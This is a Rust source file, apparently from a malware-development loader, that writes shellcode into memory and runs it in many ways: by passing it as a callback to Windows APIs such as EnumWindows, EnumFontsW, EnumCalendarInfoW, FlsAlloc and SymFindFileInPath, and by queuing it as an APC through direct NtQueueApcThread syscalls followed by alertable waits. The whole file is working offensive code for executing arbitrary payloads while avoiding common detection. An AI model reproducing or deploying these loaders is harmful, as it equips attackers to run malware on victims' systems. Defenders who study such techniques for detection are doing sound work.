#[cfg(feature = "ShellcodeExecuteEnumThreadWindows")]
pub fn shellcode_execute_enumthreadwindows(payload: Vec<u8>) -> bool {
    match inject_shellcode(&payload) {
        Ok(start_address) => {
            match exec_payload_via_callback_func_enumthreadwindows(start_address, None) {
                Ok(_) => true,
                Err(_) => false,
            }
        }
        Err(_) => false,
    }
}

// =======================================================================================================
// EXECUTION METHOD: EnumerateLoadedModules    
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteEnumerateLoadedModulesW64")]
use windows_sys::Win32::System::{Diagnostics::Debug::EnumerateLoadedModulesW64, Threading::GetCurrentProcess};

#[cfg(feature = "ShellcodeExecuteEnumerateLoadedModulesW64")]
fn exec_payload_via_callback_func_enumerateloadedmodulesw64(
    start_address: *mut c_void,
) -> Result<(), String> {
    let success = unsafe {
        EnumerateLoadedModulesW64(GetCurrentProcess(), transmute(start_address), null_mut())
    };
    Ok(())
}

#[cfg(feature = "ShellcodeExecuteEnumerateLoadedModulesW64")]
pub fn shellcode_execute_enumerateloadedmodulesw64(payload: Vec<u8>) -> bool {
    match inject_shellcode(&payload) {
        Ok(start_address) => {
            match exec_payload_via_callback_func_enumerateloadedmodulesw64(start_address) {
                Ok(_) => true,
                Err(_) => false,
            }
        }
        Err(_) => false,
    }
}

// =======================================================================================================
// EXECUTION METHOD: EnumFontsW   
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteEnumFontsW")]
use windows_sys::Win32::Graphics::Gdi::{EnumFontsW, GetDC};

#[cfg(feature = "ShellcodeExecuteEnumFontsW")]
fn exec_payload_via_callback_func_enumfontsw(
    start_address: *mut c_void,
    parameter: Option<isize>,
) -> Result<(), String> {
    let success = unsafe {
        EnumFontsW(
            GetDC(null_mut()),
            null_mut(),
            transmute(start_address),
            parameter.unwrap_or(0),
        )
    };
    Ok(())
}

#[cfg(feature = "ShellcodeExecuteEnumFontsW")]
pub fn shellcode_execute_enumfontsw(payload: Vec<u8>) -> bool {
    match inject_shellcode(&payload) {
        Ok(start_address) => {
            match exec_payload_via_callback_func_enumfontsw(start_address, None) {
                Ok(_) => true,
                Err(_) => false,
            }
        }
        Err(_) => false,
    }
}

// =======================================================================================================
// EXECUTION METHOD: EnumCalendarInfoW   
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteEnumCalendarInfoW")]
use windows_sys::Win32::Globalization::{CAL_SMONTHNAME1, ENUM_ALL_CALENDARS, EnumCalendarInfoW, LOCALE_USER_DEFAULT};

#[cfg(feature = "ShellcodeExecuteEnumCalendarInfoW")]
fn exec_payload_via_callback_func_enumcalendarinfow(
    start_address: *mut c_void,
) -> Result<(), String> {

    let success = unsafe {
        EnumCalendarInfoW(
            transmute(start_address),
            LOCALE_USER_DEFAULT,
            ENUM_ALL_CALENDARS,
            CAL_SMONTHNAME1,
        )
    };
    Ok(())
}

#[cfg(feature = "ShellcodeExecuteEnumCalendarInfoW")]
pub fn shellcode_execute_enumcalendarinfow(payload: Vec<u8>) -> bool {
    match inject_shellcode(&payload) {
        Ok(start_address) => {
            match exec_payload_via_callback_func_enumcalendarinfow(start_address) {
                Ok(_) => true,
                Err(_) => false,
            }
        }
        Err(_) => false,
    }
}

// =======================================================================================================
// EXECUTION METHOD: EnumWindows   
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteEnumWindows")]
use windows_sys::Win32::UI::WindowsAndMessaging::EnumWindows;

#[cfg(feature = "ShellcodeExecuteEnumWindows")]
fn exec_payload_via_callback_func_enumwindows(
    start_address: *mut c_void,
    parameter: Option<isize>,
) -> Result<(), String> {

    let success: i32 = unsafe {
        EnumWindows(
            transmute(start_address),
            parameter.unwrap_or(0),
        )
    };
    Ok(())
}

#[cfg(feature = "ShellcodeExecuteEnumWindows")]
pub fn shellcode_execute_enumwindows(payload: Vec<u8>) -> bool {
    match inject_shellcode(&payload) {
        Ok(start_address) => {
            match exec_payload_via_callback_func_enumwindows(start_address, None) {
                Ok(_) => true,
                Err(_) => false,
            }
        }
        Err(_) => false,
    }
}

// =======================================================================================================
// EXECUTION METHOD: EnumPwrSchemes   
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteEnumPwrSchemes")]
use windows_sys::Win32::System::Power::EnumPwrSchemes;

#[cfg(feature = "ShellcodeExecuteEnumPwrSchemes")]
fn exec_payload_via_callback_func_enumpwrschemes(
    start_address: *mut c_void,
    parameter: Option<isize>,
) -> Result<(), String> {
    let success = unsafe { EnumPwrSchemes(transmute(start_address), parameter.unwrap_or(0)) };
    Ok(())
}

#[cfg(feature = "ShellcodeExecuteEnumPwrSchemes")]
pub fn shellcode_execute_enumpwrschemes(payload: Vec<u8>) -> bool {
    match inject_shellcode(&payload) {
        Ok(start_address) => {
            match exec_payload_via_callback_func_enumpwrschemes(start_address, None) {
                Ok(_) => true,
                Err(_) => false,
            }
        }
        Err(_) => false,
    }
}

// =======================================================================================================
// EXECUTION METHOD: SymFindFileInPath   
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteSymFindFileInPath")]
use windows_sys::Win32::{
    Foundation::MAX_PATH,
    System::{
        Diagnostics::Debug::{
            SSRVOPT_DWORDPTR, SYMSRV_INDEX_INFO, SymFindFileInPath, SymInitialize, SymSrvGetFileIndexInfo,
        },
        Threading::GetCurrentProcess,
    },
};

#[cfg(feature = "ShellcodeExecuteSymFindFileInPath")]
fn exec_payload_via_callback_func_symfindfileinpath(
    start_address: *mut c_void,
) -> Result<(), String> {
    let mut success = unsafe { SymInitialize(GetCurrentProcess(), null_mut(), 1) };
    let mut info = SYMSRV_INDEX_INFO {
        sizeofstruct: size_of::<SYMSRV_INDEX_INFO>() as u32,
        file: [0; 261],
        stripped: 0,
        timestamp: 0,
        size: 0,
        dbgfile: [0; 261],
        pdbfile: [0; 261],
        guid: unsafe { std::mem::zeroed() },
        age: 0,
        sig: 0,
    };

    success = unsafe { SymSrvGetFileIndexInfo(s!(r"C:\Windows\System32\ntdll.dll"), &mut info, 0) };
    let mut buffer = [0i8; MAX_PATH as usize];
    success = unsafe {
        SymFindFileInPath(
            GetCurrentProcess(),
            s!(r"C:\Windows\System32"),
            s!("ntdll.dll"),
            &mut info.timestamp as *mut _ as *const c_void,
            info.size,
            0,
            SSRVOPT_DWORDPTR,
            buffer.as_mut_ptr().cast(),
            transmute(start_address),
            null_mut(),
        )
    };
    Ok(())
}

#[cfg(feature = "ShellcodeExecuteSymFindFileInPath")]
pub fn shellcode_execute_symfindfileinpath(payload: Vec<u8>) -> bool {
    match inject_shellcode(&payload) {
        Ok(start_address) => {
            match exec_payload_via_callback_func_symfindfileinpath(start_address) {
                Ok(_) => true,
                Err(_) => false,
            }
        }
        Err(_) => false,
    }
}

// =======================================================================================================
// EXECUTION METHOD: FlsAlloc   
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteFlsAlloc")]
use windows_sys::Win32::System::Threading::{FLS_OUT_OF_INDEXES, FlsAlloc, FlsFree, FlsSetValue};

#[cfg(feature = "ShellcodeExecuteFlsAlloc")]
fn exec_payload_via_callback_func_flsalloc(
    start_address: *mut c_void,
) -> Result<(), String> {
    let index = unsafe { FlsAlloc(transmute(start_address)) };
    let success = unsafe { FlsSetValue(index, w!("Maldev").cast()) };
    unsafe { FlsFree(index) };
    Ok(())
}

#[cfg(feature = "ShellcodeExecuteFlsAlloc")]
pub fn shellcode_execute_flsalloc(payload: Vec<u8>) -> bool {
    match inject_shellcode(&payload) {
        Ok(start_address) => {
            match exec_payload_via_callback_func_flsalloc(start_address) {
                Ok(_) => true,
                Err(_) => false,
            }
        }
        Err(_) => false,
    }
}

// =======================================================================================================
// EXECUTION METHOD: WaitForMultipleObjectsEx APC   
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteWaitForMultipleObjectsExAPC")]
use windows_sys::Win32::{
    Foundation::CloseHandle,
    System::Threading::{CreateEventA, WaitForMultipleObjectsEx}
};

#[cfg(feature = "ShellcodeExecuteWaitForMultipleObjectsExAPC")]
use rust_syscalls::syscall;

#[cfg(feature = "ShellcodeExecuteWaitForMultipleObjectsExAPC")]
fn alertable_function3() {
    unsafe {
        let mut h_event = CreateEventA(null(), 0, 0, null());
        if !h_event.is_null() {
            WaitForMultipleObjectsEx(1, &mut h_event, 1, 30000, 1);
            CloseHandle(h_event);
        }
    }
}

#[cfg(feature = "ShellcodeExecuteWaitForMultipleObjectsExAPC")]
pub fn shellcode_execute_waitformultipleobjectsexapc(payload: Vec<u8>) -> bool {
    match inject_shellcode(&payload) {
        Ok(start_address) => {
            unsafe {
                // Get current thread handle
                let current_thread: isize = -2; // HANDLE to current thread (pseudo-handle)
                
                // Queue the APC to execute the shellcode using syscall
                let _status: i32 = syscall!(
                    "NtQueueApcThread",
                    current_thread,
                    start_address,
                    0usize,
                    0usize,
                    0usize
                );
                
                // Enter alertable wait state to execute the APC
                alertable_function3();
            }
            true
        }
        Err(_) => false,
    }
}

// =======================================================================================================
// EXECUTION METHOD: MsgWaitForMultipleObjectsEx APC   
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteMsgWaitForMultipleObjectsExAPC")]
use windows_sys::Win32::{
    Foundation::CloseHandle,
    System::Threading::CreateEventA,
    UI::WindowsAndMessaging::{MsgWaitForMultipleObjectsEx, MWMO_ALERTABLE, QS_KEY}
};

#[cfg(feature = "ShellcodeExecuteMsgWaitForMultipleObjectsExAPC")]
use rust_syscalls::syscall;

#[cfg(feature = "ShellcodeExecuteMsgWaitForMultipleObjectsExAPC")]
fn alertable_function4() {
    unsafe {
        let mut h_event = CreateEventA(null(), 0, 0, null());
        if !h_event.is_null() {
            MsgWaitForMultipleObjectsEx(1, &mut h_event, 30000, QS_KEY, MWMO_ALERTABLE);
            CloseHandle(h_event);
        }
    }
}

#[cfg(feature = "ShellcodeExecuteMsgWaitForMultipleObjectsExAPC")]
pub fn shellcode_execute_msgwaitformultipleobjectsexapc(payload: Vec<u8>) -> bool {
    match inject_shellcode(&payload) {
        Ok(start_address) => {
            unsafe {
                // Get current thread handle
                let current_thread: isize = -2; // HANDLE to current thread (pseudo-handle)
                
                // Queue the APC to execute the shellcode using syscall
                let _status: i32 = syscall!(
                    "NtQueueApcThread",
                    current_thread,
                    start_address,
                    0usize,
                    0usize,
                    0usize
                );
                
                // Enter alertable wait state to execute the APC
                alertable_function4();
            }
            true
        }
        Err(_) => false,
    }
}

// =======================================================================================================
// EXECUTION METHOD: SleepEx APC   
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteSleepExAPC")]
use windows_sys::Win32::System::Threading::SleepEx;

#[cfg(feature = "ShellcodeExecuteSleepExAPC")]
use rust_syscalls::syscall;

#[cfg(feature = "ShellcodeExecuteSleepExAPC")]
fn alertable_function1() {
    unsafe { 
        SleepEx(30000, 1) 
    };
}

#[cfg(feature = "ShellcodeExecuteSleepExAPC")]
pub fn shellcode_execute_sleepexapc(payload: Vec<u8>) -> bool {
    match inject_shellcode(&payload) {
        Ok(start_address) => {
            unsafe {
                // Get current thread handle
                let current_thread: isize = -2; // HANDLE to current thread (pseudo-handle)
                
                // Queue the APC to execute the shellcode using syscall
                let _status: i32 = syscall!(
                    "NtQueueApcThread",
                    current_thread,
                    start_address,
                    0usize,
                    0usize,
                    0usize
                );
                
                // Enter alertable wait state to execute the APC
                alertable_function1();
            }
            true
        }
        Err(_) => false,
    }
}

// =======================================================================================================
// EXECUTION METHOD: WaitForSingleObjectEx APC   
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteWaitForSingleObjectExAPC")]
use windows_sys::Win32::{
    Foundation::CloseHandle,
    System::Threading::{CreateEventA, WaitForSingleObjectEx}
};

#[cfg(feature = "ShellcodeExecuteWaitForSingleObjectExAPC")]
use rust_syscalls::syscall;

#[cfg(feature = "ShellcodeExecuteWaitForSingleObjectExAPC")]
fn alertable_function2() {
    unsafe {
        let h_event = CreateEventA(null(), 0, 0, null());
        if !h_event.is_null() {
            WaitForSingleObjectEx(h_event, 30000, 1);
            CloseHandle(h_event);
        }
    }
}

#[cfg(feature = "ShellcodeExecuteWaitForSingleObjectExAPC")]
pub fn shellcode_execute_waitforsingleobjectexapc(payload: Vec<u8>) -> bool {
    match inject_shellcode(&payload) {
        Ok(start_address) => {
            unsafe {
                // Get current thread handle
                let current_thread: isize = -2; // HANDLE to current thread (pseudo-handle)
                
                // Queue the APC to execute the shellcode using syscall
                let _status: i32 = syscall!(
                    "NtQueueApcThread",
                    current_thread,
                    start_address,
                    0usize,
                    0usize,
                    0usize
                );
                
                // Enter alertable wait state to execute the APC
                alertable_function2();
            }
            true
        }
        Err(_) => false,
    }
}

// =======================================================================================================
// EXECUTION METHOD: SignalObjectAndWait APC   
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteSignalObjectAndWaitAPC")]
use windows_sys::Win32::{
    Foundation::CloseHandle,
    System::Threading::{CreateEventA, SignalObjectAndWait}
};

#[cfg(feature = "ShellcodeExecuteSignalObjectAndWaitAPC")]
use rust_syscalls::syscall;

#[cfg(feature = "ShellcodeExecuteSignalObjectAndWaitAPC")]
fn alertable_function5() {
    unsafe {
        let h_event1 = CreateEventA(null(), 0, 0, null());
        let h_event2 = CreateEventA(null(), 0, 0, null());

        if !h_event1.is_null() && !h_event2.is_null() {
            SignalObjectAndWait(h_event1, h_event2, 30000, 1);
            CloseHandle(h_event1);
            CloseHandle(h_event2);
        }
    }
}

#[cfg(feature = "ShellcodeExecuteSignalObjectAndWaitAPC")]
pub fn shellcode_execute_signalobjectandwaitapc(payload: Vec<u8>) -> bool {
    match inject_shellcode(&payload) {
        Ok(start_address) => {
            unsafe {
                // Get current thread handle
                let current_thread: isize = -2; // HANDLE to current thread (pseudo-handle)
                
                // Queue the APC to execute the shellcode using syscall
                let _status: i32 = syscall!(
                    "NtQueueApcThread",
                    current_thread,
                    start_address,
                    0usize,
                    0usize,
                    0usize
                );
                
                // Enter alertable wait state to execute the APC
                alertable_function5();
            }
            true
        }
        Err(_) => false,
    }
}

// =======================================================================================================
// EXECUTION METHOD: EnumSystemGeoID
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteEnumSystemGeoID")]
use windows_sys::Win32::Globalization::EnumSystemGeoID;

#[cfg(feature = "ShellcodeExecuteEnumSystemGeoID")]
fn exec_payload_via_callback_func_enumsystemgeoid(start_address: *mut c_void) -> Result<(), String> {
    
    let result = unsafe {
        EnumSystemGeoID(
            16,  // GEOCLASS_NATION
            0,   // All parent geographic locations
            Some(std::mem::transmute(start_address))
        )
    };
    
    if result > 0 {
        Ok(())
    } else {
        Err(String::from(""))
    }
}

#[cfg(feature = "ShellcodeExecuteEnumSystemGeoID")]
pub fn shellcode_execute_enumsystemgeoid(bytes_to_load: Vec<u8>) -> bool {
    match inject_shellcode(&bytes_to_load) {
        Ok(base_address) => {
            match exec_payload_via_callback_func_enumsystemgeoid(base_address) {
                Ok(_) => {
                    // Sleep to allow callback execution
                    unsafe {
                        delay_execution();
                    }
                    true
                }
                Err(_) => false,
            }
        }
        Err(_) => false,
    }
}